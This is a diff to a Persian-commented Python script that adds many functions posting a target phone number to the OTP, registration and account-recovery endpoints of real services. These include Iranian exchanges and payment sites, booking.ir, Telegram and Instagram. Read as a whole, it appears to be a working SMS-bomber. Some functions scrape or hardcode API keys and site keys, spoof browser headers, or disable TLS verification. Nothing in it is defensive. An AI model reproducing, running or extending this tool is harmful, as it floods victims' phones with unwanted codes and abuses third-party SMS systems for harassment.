@@ -1,15 +1,19 @@
-import random
-import uuid
+import requests
+from bs4 import BeautifulSoup
 import re
 from re import match, sub
+import time
+from time import sleep
+from threading import Thread
+import random
+import json
+import uuid
 import socket
 import sys
 import urllib3
-import requests  
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from os import system, name
 from platform import node, system, release
-from threading import Thread
-from time import sleep
 
 
 try:
@@ -66,6 +70,1219 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
+
+
+def bit24(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = clean_phone[2:]
+        elif clean_phone.startswith('0'):
+            clean_phone = clean_phone[1:]
+        
+        if not re.match(r"^9\d{9}$", clean_phone):
+            return False
+
+        url = "https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code"
+        
+        payload = {
+            "country_code": "98",
+            "mobile": "0" + clean_phone
+        }
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://bit24.cash"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+
+def abantether(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://api.abantether.com/api/v2/auths/register/phone/send"
+        
+        payload = {
+            "phone_number": clean_phone
+        }
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "Accept-Language": "fa",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://abantether.com",
+            "Referer": "https://abantether.com/"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+        
+def ompfinex(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://api.ompfinex.com/v2/user/sign-up"
+        
+        payload = {
+            "username": clean_phone
+        }
+        
+        headers = {
+            "x-platform": "web",
+            "ngsw-bypass": "1",
+            "x-version": "307",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://ompfinex.com",
+            "Referer": "https://ompfinex.com/"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+        
+def ubitex(phone):
+    try:
+        session = requests.Session()
+        
+        # دریافت صفحه اصلی برای استخراج API Key
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        }
+        
+        response = session.get("https://ubitex.io/", headers=headers, timeout=10)
+        
+        # استخراج API Key و Secret از صفحه
+        api_key = "1b285fe3-935f-43f2-9a12-0eaace9f0607"  # مقدار پیشفرض
+        api_secret = "8d91944f-ee3c-4d44-9826-6275148637ec"  # مقدار پیشفرض
+        
+        # جستجو در JavaScript برای API Key
+        api_key_match = re.search(r'apiKey["\']?\s*[:=]\s*["\']([^"\']+)["\']', response.text)
+        api_secret_match = re.search(r'apiSecret["\']?\s*[:=]\s*["\']([^"\']+)["\']', response.text)
+        
+        if api_key_match:
+            api_key = api_key_match.group(1)
+        if api_secret_match:
+            api_secret = api_secret_match.group(1)
+
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://api.ubitex.io/api/member/v2/register"
+        
+        payload = {
+            "EmailOrMobile": clean_phone,
+            "Password": "Test123!@#",
+            "phone": clean_phone,
+            "ConfirmPassword": "Test123!@#"
+        }
+        
+        headers = {
+            "apiSecret": api_secret,
+            "apiKey": api_key,
+            "Content-Type": "application/json; charset=utf-8",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://ubitex.io",
+            "Referer": "https://ubitex.io/"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            return True
+        else:
+            return response.status_code == 400
+
+    except Exception:
+        return False
+        
+          
+def sarmayex(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = f"https://api.sarmayex.com/api/v2/otp?receiver={clean_phone}&otp_type=SMS&otp_section=REGISTER"
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Client-Type": "pwa",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://sarmayex.com",
+            "Referer": "https://sarmayex.com/"
+        }
+
+        response = requests.get(url, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+        
+def coinkade(phone):
+    try:
+        # پاکسازی و فرمت شماره
+        phone = phone.replace('+', '').replace(' ', '')
+        if phone.startswith('98'):
+            phone = '0' + phone[2:]
+        elif not phone.startswith('0'):
+            phone = '0' + phone
+
+        if not re.match(r"^09\d{9}$", phone):
+            print(f"{r}[!] Coinkade: شماره نامعتبر{a}")
+            return False
+
+        # دریافت CSRF token
+        get_url = f"https://api.coinkade.biz/user/get-user/{phone}?recaptchaValue="
+        resp = requests.get(get_url, timeout=10)
+        csrf = resp.json().get("csrfToken")
+        if not csrf:
+            print(f"{r}[!] Coinkade: نتونستم CSRF پیدا کنم!{a}")
+            return False
+        print(f"{g}[+] Coinkade: CSRF گرفته شد{a}")
+
+        # ارسال OTP
+        post_url = "https://api.coinkade.biz/otp-code?recaptchaValue="
+        payload = {"username": phone, "csrfToken": csrf}
+        headers = {
+            "Authorization": f"Bearer {csrf}",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)",
+            "Origin": "https://coinkade.biz",
+            "Referer": "https://coinkade.biz/"
+        }
+
+        response = requests.post(post_url, json=payload, headers=headers, timeout=10)
+        print(f"{y}[DEBUG] Status: {response.status_code}{a}")
+        print(f"{y}[DEBUG] Response: {response.text[:200]}{a}")
+
+        if response.status_code == 200:
+            print(f"{g}[+] Coinkade: کد ارسال شد!{a}")
+            return True
+        print(f"{r}[-] Coinkade: خطا در ارسال ({response.status_code}){a}")
+        return False
+
+    except Exception as e:
+        print(f"{r}[!] Coinkade Exception: {e}{a}")
+        return False
+        
+def twox(phone):
+    try:
+        # پاکسازی و فرمت شماره
+        phone = phone.replace('+', '').replace(' ', '')
+        if phone.startswith('98'):
+            phone = '0' + phone[2:]
+        elif not phone.startswith('0'):
+            phone = '0' + phone
+
+        if not re.match(r"^09\d{9}$", phone):
+            print(f"{r}[!] Twox: شماره نامعتبر{a}")
+            return False
+
+        url = f"https://api.twox.ir/api/accounts/signin?username={phone}&otpKind=1"
+        payload = {
+            "token": "اینجا JWT توکن خود سایت یا session خود را قرار بده"
+        }
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "fa-IR",
+            "x-agent-source": "web mobile",
+            "Content-Type": "application/json; charset=utf-8",
+            "User-Agent": "Mozilla/5.0"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+
+        print(f"{y}[DEBUG] Status: {response.status_code}{a}")
+        print(f"{y}[DEBUG] Response: {response.text[:200]}{a}")
+
+        if response.status_code == 200:
+            print(f"{g}[+] Twox: کد OTP ارسال شد!{a}")
+            return True
+        else:
+            print(f"{r}[-] Twox: خطا در ارسال ({response.status_code}){a}")
+            return False
+
+    except Exception as e:
+        print(f"{r}[!] Twox Exception: {e}{a}")
+        return False
+        
+def arzunex(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+
+        if not re.match(r"^09\d{9}$", clean_phone):
+            print(f"{r}[!] ArzUnex: شماره نامعتبر{a}")
+            return False
+
+        url = "https://arzunex.ir/core/api/v2/public/customer/auth/otp/generate"
+        payload = {"mobile": clean_phone}
+        headers = {
+            "Content-Type": "application/json",
+            "Accept": "application/json, text/plain, */*"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+
+        print(f"{y}[DEBUG] Status: {response.status_code}{a}")
+        print(f"{y}[DEBUG] Response: {response.text[:200]}{a}")
+
+        if response.status_code in [200, 201]:  # تغییر این خط
+            print(f"{g}[+] ArzUnex: OTP ارسال شد!{a}")
+            return True
+        else:
+            print(f"{r}[-] ArzUnex: خطا در ارسال ({response.status_code}){a}")
+            return False
+
+    except Exception as e:
+        print(f"{r}[!] ArzUnex Exception: {e}{a}")
+        return False
+        
+    
+def gruccia(phone, firstname="نام", lastname="نام‌خانوادگی", password="123456Mm@"):
+    try:
+        # پاکسازی شماره
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+
+        if not re.match(r"^09\d{9}$", clean_phone):
+            print(f"{r}[!] Gruccia: شماره نامعتبر{a}")
+            return False
+
+        url = "https://gruccia.ir/login?back=my-account"
+        payload = {
+            "username": clean_phone,
+            "id_customer": "",
+            "back": "",
+            "firstname": firstname,
+            "lastname": lastname,
+            "password": password,
+            "action": "register",
+            "ajax": "1"
+        }
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Accept": "*/*",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0"
+        }
+
+        response = requests.post(url, data=payload, headers=headers, timeout=10)
+
+        print(f"{y}[DEBUG] Status: {response.status_code}{a}")
+        print(f"{y}[DEBUG] Response: {response.text[:200]}{a}")
+
+        if response.status_code == 200:
+            print(f"{g}[+] Gruccia: درخواست ثبت نام ارسال شد!{a}")
+            return True
+        else:
+            print(f"{r}[-] Gruccia: خطا در ارسال ({response.status_code}){a}")
+            return False
+
+    except Exception as e:
+        print(f"{r}[!] Gruccia Exception: {e}{a}")
+        return False
+        
+def booking(phone):
+    try:
+        session = requests.Session()
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        }
+        
+        session.get("https://www.booking.ir/fa/auth/recovery", headers=headers, timeout=10)
+        
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = clean_phone[2:]
+        elif clean_phone.startswith('0'):
+            clean_phone = clean_phone[1:]
+        
+        if not re.match(r"^9\d{9}$", clean_phone):
+            return False
+
+        url = "https://www.booking.ir/fa/v2/sendrecoveryaccountcodebymobile/"
+        
+        payload = {
+            "mobile": clean_phone,
+            "countryCode": "IR"
+        }
+        
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Accept": "*/*",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://www.booking.ir",
+            "Referer": "https://www.booking.ir/fa/auth/recovery"
+        }
+
+        response = session.post(url, data=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+
+
+
+def mydigipay(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://api.mydigipay.com/digipay/api/users/send-sms"
+        
+        payload = {
+            "cellNumber": clean_phone,
+            "device": {
+                "deviceId": str(uuid.uuid4()),
+                "deviceModel": "iOS/Safari",
+                "deviceAPI": "WEB_BROWSER",
+                "osName": "WEB"
+            }
+        }
+        
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+        
+        
+        
+
+def vakiljo(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://vakiljo.ir/api/graphql"
+        
+        payload = {
+            "query": "mutation($mobile:String!){challengeUser(mobile:$mobile){status message}}",
+            "variables": {"mobile": clean_phone}
+        }
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+        
+        
+        
+def nikpardakht(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://api.nikpardakht.com/api/v1/register"
+        
+        payload = {
+            "mobile": clean_phone,
+            "type": "natural", 
+            "endPointType": "v1/register"
+        }
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://nikpardakht.com",
+            "Referer": "https://nikpardakht.com/"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        # بررسی دقیق‌تر پاسخ
+        if response.status_code == 200:
+            return True
+        elif response.status_code == 429:
+            print(f"{y}[-] NikPardakht: محدودیت ارسال{a}")
+            return False
+        else:
+            print(f"{r}[-] NikPardakht: خطا - {response.status_code}{a}")
+            return False
+
+    except Exception as e:
+        print(f"{r}[!] NikPardakht: خطا - {e}{a}")
+        return False
+        
+        
+def payaneh(phone):
+    try:
+        session = requests.Session()
+        
+        # اول صفحه اصلی رو بگیریم تا site-key رو استخراج کنیم
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        }
+        
+        # دریافت صفحه اصلی
+        response = session.get("https://payaneh.ir/", headers=headers, timeout=10)
+        
+        # استخراج site-key از صفحه
+        site_key = "P/SX1ZuIKISPHngo"  # مقدار پیشفرض
+        site_key_match = re.search(r'site-key["\']?\s*[:=]\s*["\']([^"\']+)["\']', response.text)
+        if site_key_match:
+            site_key = site_key_match.group(1)
+        
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://api-v2.payaneh.ir/api/otp-send"
+        
+        payload = {
+            "phone": clean_phone
+        }
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "site-key": site_key,
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://payaneh.ir",
+            "Referer": "https://payaneh.ir/"
+        }
+
+        response = session.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+   
+        
+
+def fadaktrains(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://apigateway.fadaktrains.com/api/auth/otp"
+        
+        payload = {
+            "phoneNumber": clean_phone
+        }
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://fadaktrains.com",
+            "Referer": "https://fadaktrains.com/"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+        
+        
+def charter118(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://charter118.ir/_booking/home/token/initial_auth"
+        
+        # تولید token ساده (در واقعیت可能需要الگوریتم خاص)
+        import hashlib
+        token = hashlib.sha1(f"{clean_phone}{int(time.time())}".encode()).hexdigest()
+        
+        payload = {
+            "mobile": clean_phone,
+            "token": token
+        }
+        
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://charter118.ir",
+            "Referer": "https://charter118.ir/"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+        
+        
+        
+def accounts1606(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        # تولید timestamp فعلی
+        timestamp = str(int(time.time() * 1000))
+        url = f"https://accounts.1606.ir/otp/create?timestamp={timestamp}"
+        
+        payload = {
+            "phoneOrEmail": clean_phone
+        }
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://accounts.1606.ir",
+            "Referer": "https://accounts.1606.ir/"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+        
+        
+def azkivam(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://api.azkivam.com/auth/login"
+        
+        payload = {
+            "mobileNumber": clean_phone,
+            "source": None
+        }
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://azkivam.com",
+            "Referer": "https://azkivam.com/",
+            "x-zrk-cs": "BYPASS"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+
+def arzplus(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://api.arzplus.net/api/v1/accounts/signup/init/"
+        
+        payload = {
+            "phone": clean_phone
+        }
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://arzplus.net",
+            "Referer": "https://arzplus.net/"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+        
+      
+def raastin(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://api.raastin.com/api/v1/accounts/signup/init/"
+        
+        payload = {
+            "phone": clean_phone
+        }
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://raastin.com",
+            "Referer": "https://raastin.com/"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+def tabdeal(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://api-web.tabdeal.org/register/"
+        
+        payload = {
+            "phone_or_email": clean_phone
+        }
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "Accept-Language": "fa-ir",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://tabdeal.org",
+            "Referer": "https://tabdeal.org/"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False      
+
+
+
+def bitpin(phone):
+    try:
+        clean_phone = phone.replace('+', '').replace(' ', '')
+        if clean_phone.startswith('98'):
+            clean_phone = '0' + clean_phone[2:]
+        elif not clean_phone.startswith('0'):
+            clean_phone = '0' + clean_phone
+        
+        if not re.match(r"^09\d{9}$", clean_phone):
+            return False
+
+        url = "https://api.bitpin.ir/v3/usr/authenticate/"
+        
+        payload = {
+            "device_type": "web",
+            "password": "123Mm@Mm",  # رمز عبور ثابت
+            "phone": clean_phone
+        }
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
+            "Origin": "https://bitpin.ir",
+            "Referer": "https://bitpin.ir/"
+        }
+
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        return response.status_code == 200
+
+    except Exception:
+        return False
+
+def telegram_send(phone):
+    try:
+        # ایجاد یک session جدید
+        session = requests.Session()
+        
+        # درخواست اولیه برای ارسال کد
+        api_url = "https://my.telegram.org/auth/send_password"
+        
+        # داده‌های مورد نیاز
+        data = {
+            'phone': phone
+        }
+        
+        # هدرها
+        headers = {
+            'User-Agent': random.choice(user_agents),
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': 'https://my.telegram.org',
+            'Referer': 'https://my.telegram.org/auth',
+        }
+        
+        # ارسال درخواست
+        response = session.post(api_url, data=data, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            return True
+        else:
+            print(f"{r}[!] تلگرام: خطا - کد وضعیت {response.status_code}{a}")
+            return False
+            
+    except Exception as e:
+        print(f"{r}[!] تلگرام: خطا - {e}{a}")
+        return False
+
+# تابع برای دریافت کد اینستاگرام
+def instagram_send(phone):
+    try:
+        # ایجاد session
+        session = requests.Session()
+        
+        # دریافت CSRF token
+        login_page = session.get('https://www.instagram.com/accounts/login/')
+        csrf_token = login_page.cookies.get('csrftoken')
+        
+        # داده‌های درخواست
+        data = {
+            'phone_number': phone,
+            'client_id': session.cookies.get('csrftoken'),
+            'seamless_login_enabled': '1',
+            'tos_version': 'row',
+            'opt_into_one_tap': 'false'
+        }
+        
+        # هدرها
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+            'X-CSRFToken': csrf_token,
+            'X-Instagram-AJAX': '1',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Referer': 'https://www.instagram.com/accounts/login/',
+        }
+        
+        # ارسال درخواست
+        response = session.post('https://www.instagram.com/accounts/send_signup_sms_code/',
+                              data=data, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            return True
+        else:
+            print(f"{r}[!] اینستاگرام: خطا - کد وضعیت {response.status_code}{a}")
+            return False
+            
+    except Exception as e:
+        print(f"{r}[!] اینستاگرام: خطا - {e}{a}")
+        return False
+        
+
+def sibbank(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            'accept': 'application/json, text/plain, */*',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.5',
+            'connection': 'keep-alive',
+            'content-type': 'application/json',
+            'host': 'api.sibbank.ir',
+            'origin': 'https://sibbank.ir',
+            'referer': 'https://sibbank.ir/',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'TE': 'trailers',
+            'user-agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+        }
+        
+        payload = {
+            "phone_number": formatted_phone
+        }
+        
+        response = requests.post(
+            "https://api.sibbank.ir/v1/auth/login",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[sibbank] Status: {response.status_code}{a}')
+        print(f'{y}[sibbank] Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(sibbank) OTP sent successfully! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] sibbank error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] sibbank exception: {e}{a}')
+        return False
+
+def dastakht(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "Accept": "application/json",
+            "Content-Type": "application/json"
+        }
+        
+        payload = {
+            "mobile": formatted_phone,
+            "countryCode": 98,
+            "device_os": 2
+        }
+        
+        response = requests.post(
+            "https://dastkhat-isad.ir/api/v1/user/store",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[dastakht] Status: {response.status_code}{a}')
+        print(f'{y}[dastakht] Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(dastakht) OTP sent successfully! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] dastakht error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] dastakht exception: {e}{a}')
+        return False
+        
+
+def pinket(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "Origin": "https://pinket.com",
+            "Referer": "https://pinket.com/"
+        }
+        
+        payload = {
+            "phoneNumber": formatted_phone
+        }
+        
+        response = requests.post(
+            "https://pinket.com/api/cu/v2/phone-verification",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
